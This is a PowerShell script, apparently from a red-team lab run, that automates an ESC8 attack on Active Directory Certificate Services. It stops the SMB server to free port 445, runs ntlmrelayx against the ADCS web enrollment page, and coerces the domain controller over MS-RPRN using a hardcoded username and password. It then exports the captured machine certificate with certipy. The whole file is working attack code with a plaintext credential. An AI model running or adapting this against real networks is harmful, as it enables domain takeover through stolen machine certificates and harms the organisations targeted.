# ESC8 (WT052) v6 - correct approach: relay on port 445
# Root cause of 8445 failure: MS-RPRN coerced connection always goes to port 445
# (coercer --smb-port only sets ITS OWN detection listener). So we free 445 by
# disabling LanmanServer recovery + stopping it, bind ntlmrelayx on 445, coerce.
# State is restored at the end (recovery actions + service started).
$ErrorActionPreference = "Continue"

$venv   = "C:\Tools\RedStrike\.venv\Scripts"
$work   = "C:\Tools\cadre-attack"
$outdir = "$work\esc8-v6"
New-Item -ItemType Directory -Force -Path $outdir | Out-Null
Set-Location $work

$relayLog  = "$outdir\relay.log"
$relayErr  = "$outdir\relay.err"
$coerceLog = "$outdir\coerce.log"

$listenerIp = "192.168.77.62"
$adcsTarget = "http://dc01.cadre.local/certsrv/certfnsh.asp"
$dcIp       = "192.168.77.10"

Write-Output "=== ESC8 v6 (port 445) | $(Get-Date -Format o) ==="

# --- 0. Snapshot current recovery config for restore ---
$recBefore = sc.exe qfailure LanmanServer | Out-String
Write-Output "recovery_before=$($recBefore -replace "`r`n"," | ")"

# --- 1. Free port 445: disable recovery + stop LanmanServer ---
sc.exe failure LanmanServer reset= 0 actions= "" | Out-Null
Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
# Wait for kernel srv2 driver to release the port (can take several seconds)
$free = $false
for ($i = 0; $i -lt 15; $i++) {
  Start-Sleep -Seconds 1
  if (-not [bool](Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue)) { $free = $true; break }
}
Write-Output "port445_free=$free (waited $i s)"
(sc.exe query LanmanServer | Select-String "STATE").ToString()

# --- 2. Start ntlmrelayx on 445 ---
Remove-Item $relayLog,$relayErr -ErrorAction SilentlyContinue
$relayArgs = @("$venv\ntlmrelayx.py","--smb-port","445","-t",$adcsTarget,"--adcs","--template","Machine","-smb2support","-ip",$listenerIp,"-debug")
$relayProc = Start-Process -FilePath "$venv\python.exe" -ArgumentList $relayArgs `
  -WorkingDirectory $work -WindowStyle Hidden -PassThru `
  -RedirectStandardOutput $relayLog -RedirectStandardError $relayErr
Write-Output "relay_pid=$($relayProc.Id)"
Start-Sleep -Seconds 12
$listen = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
Write-Output "relay_listening_445=$([bool]$listen)"

# --- 3. Coerce dc01$ MS-RPRN -> ws01:445 ---
$env:PYTHONIOENCODING = "utf-8"
$env:PYTHONUTF8 = "1"
Write-Output "=== coercing dc01$ MS-RPRN to ${listenerIp}:445 ==="
& "$venv\coercer.exe" coerce `
  -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip $dcIp `
  -t $dcIp -l $listenerIp `
  --filter-protocol-name MS-RPRN --auth-type smb --always-continue 2>&1 | Tee-Object -FilePath $coerceLog
Write-Output "coerce_rc=$LASTEXITCODE"

# --- 4. Wait for relay processing ---
Write-Output "waiting 20s for relay..."
Start-Sleep -Seconds 20
Write-Output "=== relay.log tail ==="
if (Test-Path $relayLog) { Get-Content $relayLog -Tail 60 }

# --- 5. Detect ntlmrelayx pem pairs + convert via certipy ---
Write-Output "=== ntlmrelayx pem files ==="
$certPems = Get-ChildItem $work -Filter "*_cert.pem" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
if ($certPems) {
  $certPems | ForEach-Object { Write-Output "PEM: $($_.LastWriteTime) $($_.Name)" }
  $base = $certPems[0].BaseName -replace "_cert$",""
  Write-Output "=== certipy cert -pfx (pem->pfx) ==="
  $certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
  & $certpy cert -pfx "$work\$base" -export -out "$outdir\certs\$base" 2>&1 | Select-Object -Last 12
  Get-ChildItem "$outdir\certs" -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "OUT: $($_.Name)" }
} else {
  Write-Output "NO_PEM_CAPTURED"
}

# --- 6. Cleanup: stop relay + restore LanmanServer ---
if ($relayProc -and -not $relayProc.HasExited) { Stop-Process -Id $relayProc.Id -Force -ErrorAction SilentlyContinue }
sc.exe failure LanmanServer reset= 86400 actions= restart/60000/restart/120000 | Out-Null
Start-Service LanmanServer -ErrorAction SilentlyContinue
Start-Sleep -Seconds 4
$restored = (Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue | Measure-Object).Count
Write-Output "port445_restored_listeners=$restored"
(sc.exe query LanmanServer | Select-String "STATE").ToString()
Write-Output "=== ESC8_V6_DONE ==="
